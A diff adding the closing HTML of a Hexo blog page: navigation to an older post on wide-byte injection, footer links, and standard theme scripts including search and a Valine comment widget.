+    <li class="next">
+      <a href="/2018/11/02/WideBytesInj/" title="宽字节注入"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ZenisLTZ" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/borislee26@gmail.com" target="_blank" title="E-Mail" data-toggle=tooltip data-placement=top><i class="icon icon-E-Mail"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script src="/js/plugin.min.js"></script>
+<script src="/js/application.js"></script>
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
